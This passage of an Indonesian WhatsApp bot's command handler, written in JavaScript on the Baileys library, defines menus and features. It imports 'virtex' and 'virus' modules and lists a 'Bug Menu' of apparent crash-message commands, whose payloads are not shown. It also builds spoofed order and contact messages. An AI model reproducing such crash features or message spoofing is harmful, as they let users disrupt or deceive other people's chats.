process.on('uncaughtException', console.error)
require('../options/config')
require('../options/Mess')
var { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
var fs = require('fs')
var util = require('util')
var chalk = require('chalk')
var { exec, spawn, execSync } = require("child_process")
var axios = require('axios')
var path = require('path')
var os = require('os')
var fetch = require('node-fetch')
var crypto = require('crypto')
var toMs = require('ms')
var moment = require('moment-timezone')
var { JSDOM } = require('jsdom')
var speed = require('performance-now')
var x = require('xfarr-api')
var maker = require('mumaker')
var ggs = require('google-it')
var { performance } = require('perf_hooks')
var { Primbon } = require('scrape-primbon')
var primbon = new Primbon()
var hx = require("hxz-api")
var { Quotes, MerdekaNews } = require("dhn-api")
var { EmojiAPI } = require("emoji-api")
var emoji = new EmojiAPI()
var yts = require('yt-search')
var { pinterest, wallpaper, wikimedia, quotesAnime, aiovideodl, umma, ringtone, styletext } = require('../message/scrape/scraper.js')
var { mediafireDl } = require('../message/scrape/mediafire.js')
var { jadibot } = require('../message/jadibot')
var { philips } = require('../message/virtex/philips')
var { virus } = require('../message/virtex/virus')
var { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, packname, author, fetchJson, getBuffer, jsonformat, creator, format, parseMention, getRandom, generateProfilePicture, reSize}= require('../message/myfunc')
var { color, bgcolor } = require("../message/color")

const ini_mark = `0@s.whatsapp.net`
const ownernya = ownernomer + '@s.whatsapp.net'
const botnya = botnomer + '@s.whatsapp.net'

//━━━━━━━━━━━━━━━[ READ DATABASE ]━━━━━━━━━━━━━━━━━//

global.db = JSON.parse(fs.readFileSync('./pth/database.json'))
var antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
...(global.db || {})
}

//━━━━━━━━━━━━━━━[ READ IMAGE ]━━━━━━━━━━━━━━━━━//

var thumbnail = fs.readFileSync('./file/image/Cupid-Bot.jpg')
var fake = fs.readFileSync('./file/image/logo.jpg')

//━━━━━━━━━━━━━━━[ TIME ]━━━━━━━━━━━━━━━━━//

var tanggl = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
var timetime = moment().tz('Asia/Jakarta').format("HH:mm:ss")
var timeMak = moment().tz('Asia/Makassar').format("HH:mm:ss");
var timeJay = moment().tz('Asia/Jayapura').format("HH:mm:ss");

var time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Kok Belum Tidur'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Malam'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Begadang Ya'
 }

//━━━━━━━━━━━━━━━[ MODULE EXPORTS ]━━━━━━━━━━━━━━━━━//

module.exports = zeroyt7 = async (zeroyt7, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢+âœ“_=|~!?@#$%^&.Â©^]/gi.test(body) ? body.match(/^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢+âœ“_=|~!?@#$%^&.Â©^]/gi)[0] : "" : prefa ?? global.prefix
var isCmd = body.startsWith(prefix)
var command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
var args = body.trim().split(/ +/).slice(1)
var pushname = m.pushName || "No Name"
var botNumber = await zeroyt7.decodeJid(zeroyt7.user.id)
var isOwner = global.owner == m.sender ? true : ["62895396237991@s.whatsapp.net"].includes(m.sender) ? true : false
var itsMe = m.sender == botNumber ? true : false
var text = args.join(' ')
var q = args.join(' ')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
var quoted = m.quoted ? m.quoted : m
var mime = (quoted.msg || quoted).mimetype || ''
var isMedia = /image|video|sticker|audio/.test(mime)
var sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
var more = String.fromCharCode(8206)
var readmore = more.repeat(4001)
var groupMetadata = m.isGroup ? await zeroyt7.groupMetadata(from).catch(e => {}) : ''
var groupName = m.isGroup ? groupMetadata.subject : ''
var participants = m.isGroup ? await groupMetadata.participants : ''
var groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
var groupOwner = m.isGroup ? groupMetadata.owner : ''
var isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
var isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
var isAntilink = m.isGroup ? antilink.includes(from) : false

//━━━━━━━━━━━━━━━[ PUBLIC & SELF ]━━━━━━━━━━━━━━━━━//

if (!zeroyt7.public) {
if (isOwner && !m.key.fromMe) return
}

//━━━━━━━━━━━━━━━[ AUTOREAD ]━━━━━━━━━━━━━━━━━//

if (m.message && !m.key.fromMe) {
zeroyt7.readMessages([m.key])

//━━━━━━━━━━━━━━━[ CONSOLE ]━━━━━━━━━━━━━━━━━//

zeroyt7.sendPresenceUpdate('available', from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
var reactionMessage = {
react: {
text: args[0],
key: { remoteJid: from, fromMe: false, id: quoted.id }
}
}

//━━━━━━━━━━━━━━━[ REPLY ]━━━━━━━━━━━━━━━━━//

var reply = (teks) => {
zeroyt7.sendMessage(from, { text: teks }, { zeroyt7 })
}

//━━━━━━━━━━━━━━━[ BUTTONS ]━━━━━━━━━━━━━━━━━//

function _0x5543(_0x3e9eb3,_0x41ec3a){const _0x2b6f81=_0x35d6();return _0x5543=function(_0x4038d6,_0x45e278){_0x4038d6=_0x4038d6-(0xe8*0x5+-0x208b+0x1da4);let _0xd22925=_0x2b6f81[_0x4038d6];return _0xd22925;},_0x5543(_0x3e9eb3,_0x41ec3a);}const _0x100b3e=_0x5543;(function(_0x4daeb8,_0x2c2577){const _0x299fdf=_0x5543,_0x978eff=_0x4daeb8();while(!![]){try{const _0x8526a4=-parseInt(_0x299fdf(0x1b7))/(0x14fb+0xb7d+-0x2077)+parseInt(_0x299fdf(0x1a4))/(-0x18e4+0x14b8+0x42e*0x1)*(parseInt(_0x299fdf(0x1aa))/(-0x53a+0x898+-0x35b*0x1))+parseInt(_0x299fdf(0x1ae))/(-0x236d+0x1003+0x3*0x67a)+-parseInt(_0x299fdf(0x1a9))/(-0x21b6*-0x1+-0x1d*-0x12a+-0x4373)*(parseInt(_0x299fdf(0x1b5))/(0x4*0x241+0xcb4+-0x1*0x15b2))+-parseInt(_0x299fdf(0x1b1))/(0x2647+-0xe00+-0x1840)*(-parseInt(_0x299fdf(0x1ad))/(-0x269b+-0x3*0x3bb+0x31d4))+parseInt(_0x299fdf(0x1b8))/(-0xc8e+-0x58c+0x1223)*(parseInt(_0x299fdf(0x1a6))/(0x355*-0xb+-0x4*0x68a+0x3ed9))+-parseInt(_0x299fdf(0x1a2))/(-0xb*0x232+-0x7fe+-0x4d*-0x6b)*(parseInt(_0x299fdf(0x1a1))/(-0x1068+-0x1*0x1963+0x29d7));if(_0x8526a4===_0x2c2577)break;else _0x978eff['push'](_0x978eff['shift']());}catch(_0x401ee6){_0x978eff['push'](_0x978eff['shift']());}}}(_0x35d6,-0x2d3*-0x566+0x4732+-0x3ef81*0x1));function _0x35d6(){const _0x451184=['5480jRtkKQ','tBot','credit','2515krOnWh','20685XGNjyq','donate','menu','3066832HEujNY','2723900AHJbVl','https://tekno','simple.com/Scrip','21NWatVd','Passcode','𝚂𝚌𝚛𝚒𝚙𝚝','𝗠𝗘','996ZuLoIL','𝗢𝗪𝗡𝗘𝗥','1100823uuayFl','5292EOPhHB','https://teknos','𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍','𝗖𝗥𝗘𝗗𝗜𝗧','𝗗𝗢𝗡𝗔𝗧𝗘','19536KbDyYv','10593QmqWOp','imple.com/','394SFhsJo','owner'];_0x35d6=function(){return _0x451184;};return _0x35d6();}const buttonsDefault=[{'urlButton':{'displayText':_0x100b3e(0x1ba),'url':_0x100b3e(0x1b9)+_0x100b3e(0x1a3)+_0x100b3e(0x1b2)}},{'urlButton':{'displayText':_0x100b3e(0x1b3),'url':_0x100b3e(0x1af)+_0x100b3e(0x1b0)+_0x100b3e(0x1a7)}},{'quickReplyButton':{'displayText':_0x100b3e(0x1b6),'id':prefix+_0x100b3e(0x1a5)}},{'quickReplyButton':{'displayText':_0x100b3e(0x1bc),'id':prefix+_0x100b3e(0x1ab)}},{'quickReplyButton':{'displayText':_0x100b3e(0x1bb),'id':prefix+_0x100b3e(0x1a8)}}],buttons2=[{'urlButton':{'displayText':_0x100b3e(0x1ba),'url':_0x100b3e(0x1b9)+_0x100b3e(0x1a3)+_0x100b3e(0x1b2)}},{'urlButton':{'displayText':_0x100b3e(0x1b3),'url':_0x100b3e(0x1af)+_0x100b3e(0x1b0)+_0x100b3e(0x1a7)}},{'quickReplyButton':{'displayText':_0x100b3e(0x1bc),'id':prefix+_0x100b3e(0x1ab)}},{'quickReplyButton':{'displayText':_0x100b3e(0x1bb),'id':prefix+_0x100b3e(0x1a8)}}],buttons3=[{'urlButton':{'displayText':_0x100b3e(0x1ba),'url':_0x100b3e(0x1b9)+_0x100b3e(0x1a3)+_0x100b3e(0x1b2)}},{'urlButton':{'displayText':_0x100b3e(0x1b3),'url':_0x100b3e(0x1af)+_0x100b3e(0x1b0)+_0x100b3e(0x1a7)}},{'quickReplyButton':{'displayText':_0x100b3e(0x1b4)+'𝗡𝗨','id':prefix+_0x100b3e(0x1ac)}}];

//━━━━━━━━━━━━━━━[ FAKE ]━━━━━━━━━━━━━━━━━//

const ftroli = {
key: {
fromMe: false,
"participant":"0@s.whatsapp.net", 
"remoteJid": "status@broadcast"},
"message": {
orderMessage: {
itemCount: 999999999,status: 200, 
thumbnail: (fake), 
surface: 200, 
message: `Ini Ownerkuh🤗`, 
orderTitle: 'Creator', 
sellerJid: '0@s.whatsapp.net'}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded":true},
sendEphemeral: true}
const fkontak = { 
key: {
participant: `6285156357190@s.whatsapp.net`, 
remoteJid: `status@broadcast`}, 
message: { 
'contactMessage': { 
'displayName': `${pushname}`, 
'vcard': `BEGIN:VCARD
VERSION:3.0
N:XL;Cupid,;;;
FN:CupidBot
item1.TEL;waid=6285156357190:6285156357190
item1.X-ABLabel:Ponsel
END:VCARD`, 
'jpegThumbnail': (fake), 
thumbnail: (fake), 
sendEphemeral: true}}}

//━━━━━━━━━━━━━━━[ ANTILINK ]━━━━━━━━━━━━━━━━━//

if (isAntilink) {
if (!isBotAdmins) return
if (budy.includes(`https://chat.whatsapp.com/`)) {
bvl = `*GROUP LINK DETECTOR*\n\nAdmin Telah Mengirim Link, Admin Tidak Akan Dikick`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
kice = m.sender
zeroyt7.sendMessage(from, {text:`*GROUP LINK DETECTOR*\n\n@${kice.split("@")[0]} Akan Dikick Karena Mengirim Link Di Group Ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
setTimeout( () => {
zeroyt7.groupParticipantsUpdate(from, [kice], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}, 3000)
} else {
}
}
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

//━━━━━━━━━━━━━━━[ CMD WITH MEDIA ]━━━━━━━━━━━━━━━━━//

if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: zeroyt7.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, zeroyt7.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
zeroyt7.ev.emit('messages.upsert', msg)
}

//━━━━━━━━━━━━━━━[ FITUR ]━━━━━━━━━━━━━━━━━//

switch(command) {
case 'menu': {
menu = `
Halo Kak ${pushname}
Saya ${botName}
Siap Membantu Anda
Untuk Mempermudah Aktivitas
Di WhatsApp.
`
let msg = await zeroyt7.sendMessage(from, { viewOnce : true, caption: menu, image: thumbnail, templateButtons: buttonsDefault, footer: creator, mentions: [m.sender] })
sections = [
{
title: "📢𝗣𝗜𝗟𝗜𝗛 𝗗𝗜𝗕𝗔𝗪𝗔𝗛 𝗜𝗡𝗜 :",
    rows: [
        {title: "⊟ 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨", rowId: `groupmenu`},
        {title: "⊟ 𝗖𝗢𝗡𝗩𝗘𝗥𝗧 𝗠𝗘𝗡𝗨", rowId: `convertmenu`},
        {title: "⊟ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨", rowId: `ownermenu`},
        {title: "⊟ 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗥 𝗠𝗘𝗡𝗨", rowId: `downloadermenu`},
        {title: "⊟ 𝗦𝗘𝗔𝗥𝗖𝗛 𝗠𝗘𝗡𝗨", rowId: `searchmenu`},
        {title: "⊟ 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨", rowId: `funmenu`},
        {title: "⊟ 𝗣𝗥𝗜𝗠𝗕𝗢𝗡 𝗠𝗘𝗡𝗨", rowId: `primbonmenu`},
        {title: "⊟ 𝗠𝗔𝗞𝗘𝗥 𝗠𝗘𝗡𝗨", rowId: `makermenu`},
        {title: "⊟ 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨", rowId: `bugmenu`},
        {title: "⊟ 𝗦𝗢𝗨𝗡𝗗 𝗠𝗘𝗡𝗨", rowId: `soundmenu`},
        {title: "⊟ 𝗔𝗡𝗜𝗠𝗘 𝗠𝗘𝗡𝗨", rowId: `animemenu`},
        {title: "⊟ 𝗜𝗦𝗟𝗔𝗠𝗜𝗖 𝗠𝗘𝗡𝗨", rowId: `islamicmenu`},
    ]
}
]
let listMessage = {
text: `
*Gunakan ${global.botName} Dengan Bijak!!*

Bot Online Selama :
_${runtime(process.uptime())}_
`,
footer: `_Silahkan Pilih List Menunya Dibawah Ini_`,
title: `${ucapanWaktu} Kak ${pushname}`,
buttonText: "ʟɪꜱᴛ ᴍᴇɴᴜ",
sections
}
zeroyt7.sendMessage(from, listMessage, { quoted: fkontak })
}
break
case 'allmenu' : {
allmenu = `
┌─────☉「 GROUP MENU 」
│• ${prefix}linkgroup
│• ${prefix}ephemeral
│• ${prefix}setppgc
│• ${prefix}setname
│• ${prefix}setdesc
│• ${prefix}group
│• ${prefix}editinfo
│• ${prefix}add
│• ${prefix}kick
│• ${prefix}hidetag
│• ${prefix}tagall
│• ${prefix}promote
│• ${prefix}demote
│• ${prefix}antilink
│• ${prefix}listonline
└──────────────☉

┌─────☉「 Convert Menu 」
│• ${prefix}toimage
│• ${prefix}removebg
│• ${prefix}sticker
│• ${prefix}tovideo
│• ${prefix}togif
│• ${prefix}tourl
│• ${prefix}tomp3
│• ${prefix}tovn
└──────────────☉

┌─────☉「 Owner Menu 」
│• ${prefix}script
│• ${prefix}owner
│• ${prefix}join
│• ${prefix}leave
│• ${prefix}block
│• ${prefix}unblock
│• ${prefix}setppbot
│• ${prefix}setbio
│• ${prefix}listpc
│• ${prefix}listgc
│• ${prefix}jadibot
│• ${prefix}listjadibot
└──────────────☉

┌─────☉「 Downloader Menu 」
│• ${prefix}ytmp3
│• ${prefix}ytmp4
│• ${prefix}mediafire
│• ${prefix}gitclone
│• ${prefix}tiktoknowm
│• ${prefix}tiktokaudio
└──────────────☉

┌─────☉「 Search Menu 」
│• ${prefix}searchgc
│• ${prefix}play
│• ${prefix}ytsearch
│• ${prefix}google
│• ${prefix}gimage
│• ${prefix}wallpaper
│• ${prefix}wikimedia
│• ${prefix}ringtone
└──────────────☉

┌─────☉「 Fun Menu 」
│• ${prefix}fakemore
│• ${prefix}quotes
│• ${prefix}halah
│• ${prefix}jadian
│• ${prefix}jodohku
└──────────────☉

┌─────☉「 Primbon Menu 」
│• ${prefix}nomerhoki
│• ${prefix}artimimpi
│• ${prefix}artinama
│• ${prefix}ramaljodoh
│• ${prefix}ramaljodohbali
│• ${prefix}suamiistri
│• ${prefix}ramalcinta
│• ${prefix}cocoknama
│• ${prefix}pasangan
│• ${prefix}sifatusaha
│• ${prefix}rezeki
│• ${prefix}pekerjaan
│• ${prefix}penyakit
│• ${prefix}tarot
│• ${prefix}harisangar
│• ${prefix}harisial
│• ${prefix}harinaga
│• ${prefix}arahrezeki
│• ${prefix}peruntungan
│• ${prefix}weton
│• ${prefix}sifat
│• ${prefix}keberuntungan
│• ${prefix}memancing
│• ${prefix}masasubur
│• ${prefix}zodiak
└──────────────☉

┌─────☉「 Maker Menu 」
│• ${prefix}3dbox
│• ${prefix}drapwater
│• ${prefix}papercut
│• ${prefix}transformer
│• ${prefix}neondevil
│• ${prefix}3dstone
│• ${prefix}thunder
│• ${prefix}graffiti
│• ${prefix}pornhub
│• ${prefix}blackpink
│• ${prefix}glitch
│• ${prefix}glitch2
│• ${prefix}glitch3
│• ${prefix}3dspace
│• ${prefix}lion
│• ${prefix}3dneon
│• ${prefix}neon
│• ${prefix}greenneon
│• ${prefix}bokeh
│• ${prefix}hollographic
│• ${prefix}bear
│• ${prefix}wolf
│• ${prefix}joker
│• ${prefix}dropwater
│• ${prefix}neonlight
│• ${prefix}natural
│• ${prefix}carbon
│• ${prefix}pencil
│• ${prefix}candy
│• ${prefix}christmas
│• ${prefix}3dchristmas
│• ${prefix}sparklechirtmas
│• ${prefix}deepsea
│• ${prefix}scifi
│• ${prefix}rainbow
│• ${prefix}waterpipe
│• ${prefix}spooky
│• ${prefix}circuit
│• ${prefix}discovery
│• ${prefix}metalic
│• ${prefix}fiction
│• ${prefix}demon
│• ${prefix}berry
│• ${prefix}thunder
│• ${prefix}magma
│• ${prefix}harrypotter
│• ${prefix}brokenglass
│• ${prefix}watercolor
│• ${prefix}multicolor
│• ${prefix}underwater
│• ${prefix}graffitibike
│• ${prefix}snow
│• ${prefix}cloud
│• ${prefix}honey
│• ${prefix}ice
│• ${prefix}fruitjuice
│• ${prefix}biscuit
│• ${prefix}wood
│• ${prefix}chocolate
│• ${prefix}strawberry
│• ${prefix}matrix
│• ${prefix}blood
│• ${prefix}toxic
│• ${prefix}lava
│• ${prefix}rock
│• ${prefix}bloodglass
│• ${prefix}hallowen
│• ${prefix}darkgold
│• ${prefix}wicker
│• ${prefix}firework
│• ${prefix}skeleton
│• ${prefix}sand
│• ${prefix}glue
│• ${prefix}1977
│• ${prefix}leaves
└──────────────☉

┌─────☉「 Bug Menu 」
│• ${prefix}sendbug
│• ${prefix}philips
│• ${prefix}philips2
│• ${prefix}philips3
│• ${prefix}santet
│• ${prefix}santet2
│• ${prefix}santet3
│• ${prefix}virtex
│• ${prefix}virtex2
│• ${prefix}virtex3
│• ${prefix}bug1
│• ${prefix}bug2
│• ${prefix}bug3
│• ${prefix}bug4
│• ${prefix}bug5
└──────────────☉

┌─────☉「 Sound Menu 」
│• ${prefix}sound1
│• ${prefix}sound2
│• ${prefix}sound3
│• ${prefix}sound4
│• ${prefix}sound5
│• ${prefix}sound6
│• ${prefix}sound7
│• ${prefix}sound8
│• ${prefix}sound9
│• ${prefix}sound10
│• ${prefix}sound11
│• ${prefix}sound12
│• ${prefix}sound13
│• ${prefix}sound14
│• ${prefix}sound15
│• ${prefix}sound16
│• ${prefix}sound17
│• ${prefix}sound18
│• ${prefix}sound19
│• ${prefix}sound20
│• ${prefix}sound21
│• ${prefix}sound22
│• ${prefix}sound23
│• ${prefix}sound24
│• ${prefix}sound25
│• ${prefix}sound26
│• ${prefix}sound27
│• ${prefix}sound28
│• ${prefix}sound29
│• ${prefix}sound30
│• ${prefix}sound31
│• ${prefix}sound32
│• ${prefix}sound33
│• ${prefix}sound34
│• ${prefix}sound35
│• ${prefix}sound36
│• ${prefix}sound37
│• ${prefix}sound38
│• ${prefix}sound39
│• ${prefix}sound40
│• ${prefix}sound41
│• ${prefix}sound42
│• ${prefix}sound43
│• ${prefix}sound44
│• ${prefix}sound45
│• ${prefix}sound46
│• ${prefix}sound47
│• ${prefix}sound48
│• ${prefix}sound49
│• ${prefix}sound50
│• ${prefix}sound51
│• ${prefix}sound52
│• ${prefix}sound53
│• ${prefix}sound54
│• ${prefix}sound55
│• ${prefix}sound56
│• ${prefix}sound57
│• ${prefix}sound58
│• ${prefix}sound59
│• ${prefix}sound60
│• ${prefix}sound61
│• ${prefix}sound62
│• ${prefix}sound63
│• ${prefix}sound64
│• ${prefix}sound65
│• ${prefix}sound66
│• ${prefix}sound67
│• ${prefix}sound68
│• ${prefix}sound69
│• ${prefix}sound70
│• ${prefix}sound71
│• ${prefix}sound72
│• ${prefix}sound73
│• ${prefix}sound74
└──────────────☉

┌─────☉「 Anime Menu 」
│• ${prefix}cry
│• ${prefix}hug
│• ${prefix}pat
│• ${prefix}bully
│• ${prefix}lick
│• ${prefix}kiss
│• ${prefix}awoo
│• ${prefix}waifu
│• ${prefix}shinobu
│• ${prefix}cuddle
│• ${prefix}megumin
│• ${prefix}slap
│• ${prefix}neko
│• ${prefix}wink
│• ${prefix}dance
│• ${prefix}poke
│• ${prefix}glomp
│• ${prefix}bite
│• ${prefix}nom
│• ${prefix}handhold
│• ${prefix}highfive
│• ${prefix}wave
│• ${prefix}smug
│• ${prefix}smile
│• ${prefix}bonk
└──────────────☉

┌─────☉「 Islamic Menu 」
│• ${prefix}kisahnabi
│• ${prefix}niatsholat
│• ${prefix}asmaulhusna
│• ${prefix}doaharian
│• ${prefix}bacaansholat
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: allmenu, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'groupmenu': {
groupm = `
┌─────☉「 GROUP MENU 」
│• ${prefix}linkgroup
│• ${prefix}ephemeral
│• ${prefix}setppgc
│• ${prefix}setname
│• ${prefix}setdesc
│• ${prefix}group
│• ${prefix}editinfo
│• ${prefix}add
│• ${prefix}kick
│• ${prefix}hidetag
│• ${prefix}tagall
│• ${prefix}promote
│• ${prefix}demote
│• ${prefix}antilink
│• ${prefix}listonline
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: groupm, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'convertmenu': {
convertm = `
┌─────☉「 Convert Menu 」
│• ${prefix}toimage
│• ${prefix}removebg
│• ${prefix}sticker
│• ${prefix}tovideo
│• ${prefix}togif
│• ${prefix}tourl
│• ${prefix}tomp3
│• ${prefix}tovn
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: convertm, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'ownermenu': {
ownerm = `
┌─────☉「 Owner Menu 」
│• ${prefix}script
│• ${prefix}owner
│• ${prefix}join
│• ${prefix}leave
│• ${prefix}block
│• ${prefix}unblock
│• ${prefix}setppbot
│• ${prefix}setbio
│• ${prefix}listpc
│• ${prefix}listgc
│• ${prefix}jadibot
│• ${prefix}listjadibot
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: ownerm, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'downloadermenu': {
downloaderm = `
┌─────☉「 Downloader Menu 」
│• ${prefix}ytmp3
│• ${prefix}ytmp4
│• ${prefix}mediafire
│• ${prefix}gitclone
│• ${prefix}tiktoknowm
│• ${prefix}tiktokaudio
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: downloaderm, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'searchmenu': {
searchm = `
┌─────☉「 Search Menu 」
│• ${prefix}searchgc
│• ${prefix}play
│• ${prefix}ytsearch
│• ${prefix}google
│• ${prefix}gimage
│• ${prefix}wallpaper
│• ${prefix}wikimedia
│• ${prefix}ringtone
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: searchm, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'funmenu': {
funm = `
┌─────☉「 Fun Menu 」
│• ${prefix}fakemore
│• ${prefix}quotes
│• ${prefix}halah
│• ${prefix}jadian
│• ${prefix}jodohku
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: funm, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'primbonmenu': {
primbonm = `
┌─────☉「 Primbon Menu 」
│• ${prefix}nomerhoki
│• ${prefix}artimimpi
│• ${prefix}artinama
│• ${prefix}ramaljodoh
│• ${prefix}ramaljodohbali
│• ${prefix}suamiistri
│• ${prefix}ramalcinta
│• ${prefix}cocoknama
│• ${prefix}pasangan
│• ${prefix}sifatusaha
│• ${prefix}rezeki
│• ${prefix}pekerjaan
│• ${prefix}penyakit
│• ${prefix}tarot
│• ${prefix}harisangar
│• ${prefix}harisial
│• ${prefix}harinaga
│• ${prefix}arahrezeki
│• ${prefix}peruntungan
│• ${prefix}weton
│• ${prefix}sifat
│• ${prefix}keberuntungan
│• ${prefix}memancing
│• ${prefix}masasubur
│• ${prefix}zodiak
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: primbonm, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'makermenu': {
makerm = `
┌─────☉「 Maker Menu 」
│• ${prefix}3dbox
│• ${prefix}drapwater
│• ${prefix}papercut
│• ${prefix}transformer
│• ${prefix}neondevil
│• ${prefix}3dstone
│• ${prefix}thunder
│• ${prefix}graffiti
│• ${prefix}pornhub
│• ${prefix}blackpink
│• ${prefix}glitch
│• ${prefix}glitch2
│• ${prefix}glitch3
│• ${prefix}3dspace
│• ${prefix}lion
│• ${prefix}3dneon
│• ${prefix}neon
│• ${prefix}greenneon
│• ${prefix}bokeh
│• ${prefix}hollographic
│• ${prefix}bear
│• ${prefix}wolf
│• ${prefix}joker
│• ${prefix}dropwater
│• ${prefix}neonlight
│• ${prefix}natural
│• ${prefix}carbon
│• ${prefix}pencil
│• ${prefix}candy
│• ${prefix}christmas
│• ${prefix}3dchristmas
│• ${prefix}sparklechirtmas
│• ${prefix}deepsea
│• ${prefix}scifi
│• ${prefix}rainbow
│• ${prefix}waterpipe
│• ${prefix}spooky
│• ${prefix}circuit
│• ${prefix}discovery
│• ${prefix}metalic
│• ${prefix}fiction
│• ${prefix}demon
│• ${prefix}berry
│• ${prefix}thunder
│• ${prefix}magma
│• ${prefix}harrypotter
│• ${prefix}brokenglass
│• ${prefix}watercolor
│• ${prefix}multicolor
│• ${prefix}underwater
│• ${prefix}graffitibike
│• ${prefix}snow
│• ${prefix}cloud
│• ${prefix}honey
│• ${prefix}ice
│• ${prefix}fruitjuice
│• ${prefix}biscuit
│• ${prefix}wood
│• ${prefix}chocolate
│• ${prefix}strawberry
│• ${prefix}matrix
│• ${prefix}blood
│• ${prefix}toxic
│• ${prefix}lava
│• ${prefix}rock
│• ${prefix}bloodglass
│• ${prefix}hallowen
│• ${prefix}darkgold
│• ${prefix}wicker
│• ${prefix}firework
│• ${prefix}skeleton
│• ${prefix}sand
│• ${prefix}glue
│• ${prefix}1977
│• ${prefix}leaves
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: makerm, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'bugmenu': {
bugm = `
┌─────☉「 Bug Menu 」
│• ${prefix}sendbug
│• ${prefix}philips
│• ${prefix}philips2
│• ${prefix}philips3
│• ${prefix}santet
│• ${prefix}santet2
│• ${prefix}santet3
│• ${prefix}virtex
│• ${prefix}virtex2
│• ${prefix}virtex3
│• ${prefix}bug1
│• ${prefix}bug2
│• ${prefix}bug3
│• ${prefix}bug4
│• ${prefix}bug5
└──────────────☉
`
zeroyt7.sendMessage(from, { viewOnce : true, caption: bugm, image: thumbnail, templateButtons: buttons2, footer: creator, mentions: [m.sender] })
}
break
case 'soundmenu': {
soundm = `
┌─────☉「 Sound Menu 」
│• ${prefix}sound1
│• ${prefix}sound2
